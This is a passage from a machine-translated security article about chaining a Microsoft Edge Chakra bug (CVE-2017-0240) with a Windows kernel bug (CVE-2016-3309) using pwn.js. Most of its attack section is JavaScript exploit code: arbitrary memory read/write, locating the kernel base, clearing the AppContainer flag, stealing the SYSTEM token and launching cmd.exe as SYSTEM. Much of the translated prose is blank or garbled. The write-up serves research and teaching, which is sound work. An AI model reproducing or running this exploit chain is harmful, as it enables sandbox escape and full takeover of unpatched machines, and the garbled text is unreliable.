dari teknik ini) tidak termasuk dalam program ini, karena  adalah masalah arsitektur. </p><br><h3 id="ispolzovanie-pwnjs">  Menggunakan pwn.js </h3><br><p>  Dari analisis semua teknologi keamanan, dapat disimpulkan bahwa untuk dapat mengeksekusi kode arbitrer, Anda perlu mem-bypass kotak pasir <code>AppContainer</code> .  Pada artikel ini, kami menjelaskan metode yang menggunakan kerentanan di kernel <code>Windows</code> .  Dalam hal ini, kami hanya dapat menggunakan kode <code>JS</code> dan rantai <code>ROP</code> .  Menulis sebuah exploit untuk kernel hanya menggunakan rantai <code>ROP</code> bisa sangat sulit.  Untuk menyederhanakan tugas ini, Anda dapat menemukan satu set gadget yang dengannya kami dapat memanggil metode <code>WinAPI</code> diperlukan.  Untungnya, ini sudah diterapkan di perpustakaan <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u="><code>pwn.js</code></a>  Dengan menggunakannya, setelah hanya menjelaskan fungsi <code>read</code> dan <code>write</code> untuk membaca dan menulis sewenang-wenang, Anda bisa mendapatkan <code>API</code> mudah untuk menemukan fungsi <code>WinAPI</code> diperlukan dan memanggilnya.  <code>pwn.js</code> juga menyediakan alat yang nyaman untuk bekerja dengan nilai 64-bit dan pointer dan alat untuk bekerja dengan struktur. </p><br><p>  Pertimbangkan contoh sederhana.  Pada langkah sebelumnya, kami mendapat rantai dua <code>DataView</code> terkait.  Untuk menyiapkan exploit, Anda harus membuat kelas berikut: </p><br><pre> <code class="javascript hljs"><span class="hljs-keyword"><span class="hljs-keyword">var</span></span> Exploit = (<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> ChakraExploit = pwnjs.ChakraExploit; <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> Integer = pwnjs.Integer; <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">Exploit</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{ ChakraExploit.call(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>); ... <span class="hljs-comment"><span class="hljs-comment">//  arbitrary address read/write    ... // DataView,         this.dv = ...; // DataView,     this.dv this.dv_offset = ...; //    Chakra.dll, ,     var vtable = ...; this.initChakra(vtable); } Exploit.prototype = Object.create(ChakraExploit.prototype); Exploit.prototype.constructor = Exploit; Exploit.prototype.set_dv_address = function(lo, hi) { this.dv_offset.setInt32(0x38, lo, true); this.dv_offset.setInt32(0x3c, hi, true); } Exploit.prototype.read = function (address, size) { this.set_dv_address(address.low, address.high); switch (size) { case 8: return new Integer(this.dv.getInt8(0, true), 0, true); case 16: return new Integer(this.dv.getInt16(0, true), 0, true); case 32: return new Integer(this.dv.getInt32(0, true), 0, true); case 64: return new Integer(this.dv.getInt32(0, true), this.dv.getInt32(4, true), true); } } Exploit.prototype.write = function (address, value, size) { this.set_dv_address(address.low, address.high); switch (size) { case 8: this.dv.setInt8(0, value.low, true); break; case 16: this.dv.setInt16(0, value.low, true); break; case 32: this.dv.setInt32(0, value.low, true); break; case 64: this.dv.setInt32(0, value.low, true); this.dv.setInt32(4, value.high, true); break; } } return Exploit; })();</span></span></code> </pre> <br><p>     ,      <code>MessageBoxA</code> : </p><br><pre> <code class="javascript hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">run</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">with</span></span> (<span class="hljs-keyword"><span class="hljs-keyword">new</span></span> Exploit()) { <span class="hljs-comment"><span class="hljs-comment">//alert('Chakra: ' + chakraBase.toString(16)); var MessageBoxA = importFunction('user32.dll', 'MessageBoxA', Int32); var GetActiveWindow = importFunction('user32.dll', 'GetActiveWindow', Int64); var hwnd = GetActiveWindow(); var ret = MessageBoxA(hwnd, new CString('PWNED'), new CString('PWNED'), 0); } }</span></span></code> </pre> <br><p>      : </p><br><p><img src="https://habrastorage.org/webt/vm/zb/t1/vmzbt1z0du0bnjto8mxpwzo9hac.png" alt="PWNED"></p><br><h2 id="shag-3-povyshenie-privilegiy-i-vyhod-iz-pesochnicy-s-pomoschyu-uyazvimosti-yadra">  3.           </h2><br><p>         <code>WinAPI</code> .         .      <code>CVE-2016-3309</code> .         [7]  [8],     <code>pwn.js</code> [2]    ,        <code>GDI</code> -.         [9], [10]  [11].              .        ,      .       ,                <code>AppContainer</code> ,          <code>pwn.js</code> .           <code>cmd.exe</code>    <code>SYSTEM</code> . </p><br><blockquote> GDI —   Windows          , ,    . </blockquote><p> ,             . <code>JS</code> -     64-     <code>kernel_read_64</code>  <code>kernel_write_64</code> , .        Windows.           <code>BITMAP</code> ,    . <code>pwn.js</code>     .  <code>BITMAP</code>  , , : </p><br><pre> <code class="javascript hljs"><span class="hljs-keyword"><span class="hljs-keyword">var</span></span> BITMAP = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> StructType([ [<span class="hljs-string"><span class="hljs-string">'poolHeader'</span></span>, <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> ArrayType(Uint32, <span class="hljs-number"><span class="hljs-number">4</span></span>)], <span class="hljs-comment"><span class="hljs-comment">// BASEOBJECT64 ['hHmgr', Uint64], ['ulShareCount', Uint32], ['cExclusiveLock', Uint16], ['BaseFlags', Uint16], ['Tid', Uint64], ['dhsurf', Uint64], ['hsurf', Uint64], ['dhpdev', Uint64], ['hdev', Uint64], ['sizlBitmap', SIZEL], ['cjBits', Uint32], ['pvBits', Uint64], ['pvScan0', Uint64], ]);</span></span></code> </pre> <br><p>  <code>Tid</code>       <code>KTHREAD</code>     , ,   ,   <code>EmpCheckErrataList</code> ,        .  ,        : </p><br><pre> <code class="javascript hljs">... var nt_EmpCheckErrataList_ptr = worker_bitmap_obj.Tid.add(<span class="hljs-number"><span class="hljs-number">0x2a8</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> nt_EmpCheckErrataList = kernel_read_64(nt_EmpCheckErrataList_ptr); <span class="hljs-comment"><span class="hljs-comment">/* g_config   ,         empCheckErrataList  WinDbg        : ? nt!EmpCheckErrataList - nt */</span></span> <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> ntoskrnl_base_address = nt_EmpCheckErrataList.sub( g_config.nt_empCheckErrataList_offset); ...</code> </pre> <br><p>    ,     <code>AppContainer</code>    .    <code>AppContainer</code>    <code>IsPackagedProcess</code>     ( <code>Process Environment Block</code> , <code>PEB</code> ),         .    <code>Access Token</code> ,         <code>AppContainer</code> .       <code>Access Token</code>  ,         . <code>Access Token</code>     ,     .     <code>EPROCESS</code>    <code>ActiveProcessLinks</code> ,       .   <code>PEB</code>     <code>EPROCESS</code> .          <code>PsInitialSystemProcess</code> ,   ,         <code>ActiveProcessLinks</code> . </p><br><p>    <code>Edge</code>    :      ,    <code>Edge</code>       .              <code>SYSTEM</code> .   , , <code>winlogon.exe</code> . </p><br><p>        <code>pwn.js</code>  : </p><br><pre> <code class="javascript hljs"><span class="hljs-comment"><span class="hljs-comment">//  PEB   var pinfo = _PROCESS_BASIC_INFORMATION.Ptr.cast(malloc(_PROCESS_BASIC_INFORMATION.size)); var pinfo_sz = Uint64.Ptr.cast(malloc(8)); NtQueryInformationProcess(GetCurrentProcess(), 0, pinfo, _PROCESS_BASIC_INFORMATION.size, pinfo_sz); var peb = pinfo.PebBaseAddress; /*    IsPackagedProcess       peb   char * */ var bit_field = peb[3]; bit_field = bit_field.xor(1 &lt;&lt; 4); peb[3] = bit_field; /*             WinDbg    .     : dt ntdll!_EPROCESS uniqueprocessid token activeprocesslinks           */ var ActiveProcessLinks = system_eprocess.add( g_config.ActiveProcessLinksOffset); var current_pid = GetCurrentProcessId(); var current_eprocess = null; var winlogon_pid = null; // winlogon.exe -  ,     cmd.exe var winlogon = new CString("winlogon.exe"); var image_name = malloc(16); var system_pid = kernel_read_64(system_eprocess.add( g_config.UniqueProcessIdOffset)); while(!current_eprocess || !winlogon_pid) { var eprocess = kernel_read_64(ActiveProcessLinks).sub( g_config.ActiveProcessLinksOffset); var pid = kernel_read_64(eprocess.add( g_config.UniqueProcessIdOffset)); //        //   Uint64.store( image_name.address, kernel_read_64(eprocess.add(g_config.ImageNameOffset)) ); Uint64.store( image_name.address.add(8), kernel_read_64(eprocess.add(g_config.ImageNameOffset + 8)) ); //   winlogon.exe    if(_stricmp(winlogon, image_name).eq(0)) { winlogon_pid = pid; } if (current_pid.eq(pid)) { current_eprocess = eprocess; } //        ActiveProcessLinks = eprocess.add( g_config.ActiveProcessLinksOffset); } //     var sys_token = kernel_read_64(system_eprocess.add(g_config.TokenOffset)); //          //   winlogon.exe var pi = malloc(24); memset(pi, 0, 24); var si = malloc(104 + 8); memset(si, 0, 104 + 8); Uint32.store(si.address, new Integer(104 + 8)); var args = WString("cmd.exe"); var AttributeListSize = Uint64.Ptr.cast(malloc(8)); InitializeProcThreadAttributeList(0, 1, 0, AttributeListSize); var lpAttributeList = malloc(AttributeListSize[0]); Uint64.store( si.address.add(104), lpAttributeList ); InitializeProcThreadAttributeList(lpAttributeList, 1, 0, AttributeListSize) var winlogon_handle = Uint64.Ptr.cast(malloc(8)); //       kernel_write_64(current_eprocess.add(g_config.TokenOffset), sys_token); /*        AppContainer,       winlogon.exe         winlogon.exe */ winlogon_handle[0] = OpenProcess(PROCESS_ALL_ACCESS, 0, winlogon_pid); UpdateProcThreadAttribute(lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, winlogon_handle, 8, 0, 0); CreateProcess(0, args, 0, 0, 0, EXTENDED_STARTUPINFO_PRESENT, 0, 0, si, pi);</span></span></code> </pre> <br><p>     : </p><br><p><img src="https://habrastorage.org/webt/r4/4j/lm/r44jlmrlc0reurbxe-rosf1cicu.png" alt="Final"></p><br><p>   YouTube    <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u="></a>  ,     Microsoft Edge. </p><br><h2 id="itog">  Ringkasan </h2><br><p>   : </p><br><ul><li> ,       <code>Edge</code>   <code>Windows</code> ,   13   ,        <code>CVE-2017-0240</code>  ,   .          <code>CVE-2016-3309</code> . </li><li>      <code>JS</code> </li><li>    666    <code>JS</code> </li><li>   :  <code>cmd.exe</code>    <code>SYSTEM</code> ,        </li></ul><br><p>   ,         ,                 .  ,       ,         .        . </p><br><h2 id="materialy">  </h2><br><ol><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Liu Jin — The Advanced Exploitation of 64-bit Edge Browser Use-After-Free Vulnerability on Windows 10</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Andrew Wesie, Brian Pak — 1-Day Browser &amp; Kernel <br> Exploitation</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Natalie Silvanovich — The ECMA and the Chakra. Hunting bugs in the Microsoft Edge Script Engine</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Natalie Silvanovich — Your Chakra Is Not Aligned. Hunting bugs in the Microsoft Edge Script Engine</a> </li><li> <a href="">phoenhex team — cve-2018-8629-chakra.js</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Quarkslab — Exploiting MS16-145: MS Edge TypedArray.sort Use-After-Free (CVE-2016-7288)</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Exploiting MS16-098 RGNOBJ Integer Overflow on Windows 8.1 x64 bit by abusing GDI objects</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Siberas — Kernel Exploitation Case Study — "Wild" Pool Overflow on Win10 x64 RS2 (CVE-2016-3309 Reloaded)</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Saif El-Sherei — Demystifying Windows Kernel Exploitation by Abusing GDI Objects</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Diego Juarez — Abusing GDI for ring0 exploit primitives</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Nicolas A. Economou — Abusing GDI for ring0 exploit <br> primitives: Evolution</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">pwn.js</a> </li></ol></div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/id455594/">https://habr.com/ru/post/id455594/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../id455584/index.html">Wawancara khusus dengan kekuatan internal perusahaan: melalui kesalahan penemuan</a></li>
<li><a href="../id455586/index.html">Seri Kuliah tentang Robotika oleh Profesor Gregor Schöner, Direktur Institute of Neuroinformatics (INI) Bochum, Jerman</a></li>
<li><a href="../id455588/index.html">Cara mendidik komunitas Anda agar tidak menari dengan rebana</a></li>
<li><a href="../id455590/index.html">MVCC di PostgreSQL-8. Pembekuan</a></li>
<li><a href="../id455592/index.html">Virus menyerang perusahaan industri sebagai ancaman terhadap keamanan fisik</a></li>
<li><a href="../id455596/index.html">DevConfX :: Management - laporan manajer dengan kata-kata sederhana</a></li>
<li><a href="../id455598/index.html">Tingkatkan segera Exim ke 4,92 - ada infeksi aktif</a></li>
<li><a href="../id455600/index.html">Platform 3DEXPERIENCE Membantu Menciptakan Transportasi Publik di Masa Depan</a></li>
<li><a href="../id455602/index.html">Browser memprovokasi crash dengan fuzzing perilaku</a></li>
<li><a href="../id455604/index.html">Dimungkinkan untuk mengelola konfigurasi Windows. Kisah sukses</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>